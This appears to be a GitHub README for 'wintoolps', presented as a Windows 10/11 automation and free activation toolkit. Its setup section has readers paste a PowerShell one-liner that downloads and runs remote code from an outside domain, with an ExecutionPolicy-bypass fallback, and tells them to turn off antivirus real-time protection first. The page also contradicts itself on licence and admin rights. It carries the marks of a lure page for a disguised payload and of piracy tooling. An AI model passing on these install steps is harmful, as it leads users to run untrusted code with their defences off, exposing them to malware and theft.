<div align="center">

# 🛠️ wintoolps: Windows Automation & Activation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/kqlanalytics/win10-automation-toolkit/main/poster_dcfb.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B_%2F_7%2B-e11d48?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-POSTGRESQL-f43f5e?style=flat&labelColor=0d1117)]() [![score](https://img.shields.io/badge/SCORE-4.9%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS_10_%7C_11-be123c?style=flat&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-1.2K-9f1239?style=flat&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-SUCCESS-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

wintoolps is a command-line utility for Windows 10 that streamlines system automation and activation workflows through a lightweight batch launcher. The tool manages PowerShell ExecutionPolicy transitions between Restricted and Unrestricted modes, enabling script execution while allowing users to restore the safer default afterward. A structured CMD menu exposes status reporting alongside options for enabling execution, disabling execution, and launching the bundled activator. Scripts housed in the features directory are dispatched through the launcher, and the entire workflow requires no additional software installation.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Self-contained Windows 10 toolkit**: Delivers a focused collection of system tools for Windows 10 without requiring any additional software to be installed. All functionality runs natively from the provided package.

- **Interactive command-line menu**: A single `wintoolps.bat` entry point presents a numbered menu with a live status readout, giving direct access to every bundled operation from one console session.

- **ExecutionPolicy management**: Built-in options switch the PowerShell ExecutionPolicy between Unrestricted and Restricted modes, allowing scripts to run when needed and restoring the safer default afterward to reduce exposure to malicious code.

- **Script library execution**: All scripts stored in the `features` directory are launched directly from the menu, keeping automation tasks organized and reachable without manual path handling.

- **Activation utility**: An integrated activator tool is available as a dedicated menu option, providing an easy way to automate Windows 10 activation at no cost.

- **Status visibility**: The menu header continuously displays the current ExecutionPolicy state, so the security posture of the system is always clear before and after running any operation.

- **Zero-dependency operation**: No package managers, runtimes, or third-party installers are involved. The toolkit runs from its own files using components already present in Windows 10.

- **Reversible security workflow**: Every policy change can be undone from the same menu, supporting a disciplined enable-run-restore cycle that keeps the system in its default restricted state when idle.

## How it works

wintoolps operates as a lightweight command-line wrapper around the native Windows PowerShell environment. Because the default PowerShell execution policy on Windows 10 is set to "Restricted", script files with the `.ps1` extension cannot be executed out of the box. wintoolps addresses this constraint directly, providing a controlled and reversible way to toggle the execution policy so that its bundled scripts can run without requiring any additional software installation.

The core of the tool is the `wintoolps.bat` launcher, a batch script that presents an interactive menu and mediates all policy changes and script execution. On startup, the launcher reads and displays the current `ExecutionPolicy` status, giving the user immediate visibility into the system's present security posture before any action is taken.

The menu exposes the following operations:

- `0` — Exit the launcher.
- `1` — Enable script execution by switching the `ExecutionPolicy` to "Unrestricted".
- `2` — Restore the safe default by returning the `ExecutionPolicy` to "Restricted", mitigating the risk of malicious code execution.
- `3` — Launch the activation routine from the bundled `features` directory.

A typical session follows a deliberate sequence: the user enables execution (option 1), launches the desired routine (option 3), and then restores the restrictive policy (option 2) once the operation is complete. This workflow keeps the window of permissive execution as narrow as possible and ensures the system returns to its hardened default state afterward. Exiting (option 0) terminates the launcher cleanly.

## Compatibility

wintoolps is engineered specifically for the Windows 10 operating system and relies on the native Windows PowerShell environment. The tool is self-contained and operates without requiring the installation of additional software, external runtimes, or third-party dependencies.

Because the utility modifies system-level activation states, it requires administrative privileges to execute. The batch interface manages the PowerShell `ExecutionPolicy` directly, ensuring that the necessary scripts can run regardless of the system's default restrictions. It is designed to toggle between "Restricted" and "Unrestricted" states to facilitate the activation process while allowing users to return the system to a secure configuration immediately after completion.

The tool is compatible with both 32-bit (x86) and 64-bit (x64) architectures of Windows 10. It is recommended to run the utility in an environment with the default Windows PowerShell version 5.1 or higher to ensure stable execution of the underlying scripts.

## FAQ

**Is wintoolps a standalone application or does it require additional dependencies?**
wintoolps is a self-contained toolkit. It operates through the native Windows command-line environment and PowerShell, so no third-party runtimes, frameworks, or supplementary packages need to be deployed alongside it.

**Why does wintoolps prompt me to modify the PowerShell ExecutionPolicy?**
By default, Windows enforces a "Restricted" ExecutionPolicy, which blocks the execution of .ps1 script files. Because the toolkit's feature modules are script-based, execution must be temporarily permitted for them to run. The launcher exposes a toggle between "Unrestricted" and "Restricted" so the policy can be reverted to its secure default once your operations are complete.

**What does the command-line menu provide?**
The launcher presents a numbered CMD interface that reports the current ExecutionPolicy status and exposes the following operations: exiting the tool, enabling script execution, disabling script execution to restore the safe policy, and launching the activator module. Each entry maps to a single keypress, keeping the workflow linear and auditable.

**Can I run individual feature modules without the launcher?**
Yes. The feature scripts are organized in a dedicated `features` directory and can be invoked directly through PowerShell, provided the ExecutionPolicy has already been set to "Unrestricted". The launcher simply automates the policy transition and dispatch steps.

**Does wintoolps make persistent changes to my system configuration?**
The only configuration change the toolkit performs is the ExecutionPolicy state, which is reversible through the same menu. Reverting to "Restricted" after use restores the default posture and mitigates the risk of untrusted code execution.

**Which Windows versions are supported?**
wintoolps targets Windows 10. Behavior on other Windows releases is not guaranteed, as the underlying command-line and PowerShell semantics may differ.

**Is administrative elevation required?**
Certain operations, including modifying the ExecutionPolicy at the machine scope, require an elevated command prompt. Launch the tool from a session with appropriate privileges to ensure all menu functions operate correctly.

**How should I handle antivirus or security software flags?**
Activation-related tooling is frequently flagged by heuristic scanners. Review the scripts in the `features` directory prior to execution to understand their behavior, and add exclusions only if you have verified the contents and accept the associated risk.

**What is the recommended usage sequence?**
Enable script execution, launch the desired module, complete your operation, then immediately disable script execution to return the system to its default restricted state. Following this order minimizes the window during which unsigned scripts may run.

## Disclaimer

wintoolps is provided as a system administration utility for Windows 10 environments. The software modifies local PowerShell execution policy settings and exposes script execution capabilities that are otherwise restricted by default. These operations directly affect the security posture of the host system.

By using wintoolps, you acknowledge that you are solely responsible for verifying that any activation, configuration, or automation action performed through the tool complies with the applicable licensing terms, organizational policies, and local regulations governing your Windows 10 installation. The tool does not install additional software, but it does alter execution policy state and invoke scripts from its `features` directory; each of these actions carries inherent risk and should be performed only on systems you own or are explicitly authorized to administer.

The software is supplied on an as-is basis, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. No guarantee is made regarding uninterrupted operation, absence of defects, or suitability for any specific deployment scenario. Execution policy changes, script execution, and any resulting system state modifications are undertaken at your own discretion and risk.

In no event shall the authors, contributors, or maintainers of wintoolps be liable for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use the software, including but not limited to loss of data, system instability, licensing non-compliance, or security incidents. You are advised to review the tool's behavior in a controlled environment, maintain current backups, and restore the default Restricted execution policy after completing your operations to reduce exposure to malicious code execution.

## License

This project is distributed under the MIT License, a permissive open-source license designed to maximize both freedom of use and clarity of attribution.

The license grants permission, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction. This includes, without limitation, the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the software. Attribution to the original project is therefore required in any redistributed or derivative form.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Because this project provides tools that modify Windows system configuration and activation state, users are expected to review and comply with all applicable licensing terms of the operating system and any third-party components involved. The project's license governs the distributed code only and does not extend any rights over Microsoft Windows or its activation mechanisms.

Contributions submitted to the project are accepted under the same license terms, ensuring that the codebase remains uniformly licensed and freely redistributable.